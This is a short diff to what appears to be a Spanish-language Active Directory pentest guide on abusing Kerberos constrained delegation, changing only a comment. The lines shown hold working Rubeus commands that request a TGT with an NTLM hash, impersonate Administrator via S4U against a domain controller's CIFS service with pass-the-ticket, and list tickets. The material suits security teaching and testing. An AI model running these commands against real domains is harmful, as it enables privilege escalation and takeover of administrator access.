@@ -76,7 +76,7 @@ Un atacante que ha comprometido cualquiera de estas máquinas (por ejemplo, obte
 
 ❯ ./Rubeus.exe asktgt /user:USER-SERVER /ntlm:dadef894e564c991a5a5714e0a7efc67 /domain:domain1.corp /outfile:userserver.tgt   # Solicitar un TGT
 
-❯ .\Rubeus.exe s4u /ticket:userserver.tgt /msdsspn:"HOST/First-DC.domain1.corp" /impersonateuser:Administrator /altservice:CIFS /ptt     # Se hace un Pass-The-Ticket
+❯ .\Rubeus.exe s4u /ticket:userserver.tgt /msdsspn:"HOST/First-DC.domain1.corp" /impersonateuser:Administrator /altservice:CIFS /ptt     # Se hace un Pass-The-Ticket y solicitas el TGS
 
 ❯ klist         # Mirar los tickets de servicio 
 
